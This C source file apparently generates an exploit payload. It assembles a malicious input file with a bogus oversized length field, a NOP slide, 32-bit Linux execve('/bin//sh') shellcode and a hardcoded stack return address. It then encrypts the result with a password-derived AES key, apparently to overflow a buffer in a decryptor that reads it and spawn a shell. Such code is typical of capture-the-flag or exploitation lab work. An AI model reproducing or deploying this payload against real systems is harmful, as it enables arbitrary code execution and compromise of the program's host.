#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdbool.h>
#include <openssl/md5.h>
#include <mcrypt.h>
#include <unistd.h>

char file[] = {
	// magic number
	0xde,0xc0,0xde,0xc0,
	// file size
	0xff,0xff,0xff,0xff,
	// nop slide
    0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,
    0x90,0x90,
    0xbc, 0x50, 0xd6, 0xff, 0xff, // set %esp so it doesn't overwrite our shellcode
	// shellcode
	     0x31,0xc0,0x50,
	0x68,0x2f,0x2f,0x73,
	0x68,0x68,0x2f,0x62,
	0x69,0x6e,0x89,0xe3,
	0x50,0x53,0x89,0xe1,
    0x89,0xe2,              // fix %edx
	0xb0,0x0b,0xcd,0x80,
	// return address
	0x0c,0xd6,0xff,0xff,
	0x00,0x00,0x00,0x00,
};


#define IV "AAAAAAAAAAAAAAAA"

#define MULT_BLOCK_SIZE(size)                                   \
    (!((size) % 16) ? (size) : (size) + (16 - ((size) % 16)))

void hash_password(unsigned char* digest, char* password) {
    MD5_CTX context;

    size_t len = strlen(password);

    MD5_Init(&context);
    MD5_Update(&context, password, len);
    MD5_Final(digest, &context);
}

int encrypt_buffer(void* buf, int buf_len, char* key, int key_len) {
    MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
    int blocksize = mcrypt_enc_get_block_size(td);
    if(buf_len % blocksize != 0) {
        return -1;
    }

    mcrypt_generic_init(td, key, key_len, IV);
    mcrypt_generic(td, buf, buf_len);
    mcrypt_generic_deinit (td);
    mcrypt_module_close(td);
    return 0;
}

int file_size(FILE* fp) {
    struct stat buf;
    fstat(fileno(fp), &buf);
    return buf.st_size;
}

void encrypt_file(char *raw_file, int raw_len, FILE* enc_file, unsigned char* key) {
    int size = raw_len;
    size_t block_size = MULT_BLOCK_SIZE(size);
    char* padded_block = calloc(1, block_size);
	memcpy(padded_block, raw_file, size);

    if(encrypt_buffer(padded_block, block_size, (char*)key, 16) != 0) {
       printf("There was an error encrypting the file!\n");
       return;
    }

    printf("=> Encrypted file successfully\n");
    fwrite(padded_block, 1, block_size, enc_file);
    free(padded_block);
}

int main() {
    FILE *enc = fopen("crack.enc","w");
    printf("password > ");

    char pw[16];
    fgets(pw, 16, stdin);
    unsigned char digest[16];
    hash_password(digest, pw);

    encrypt_file(file, sizeof(file), enc, digest);
}
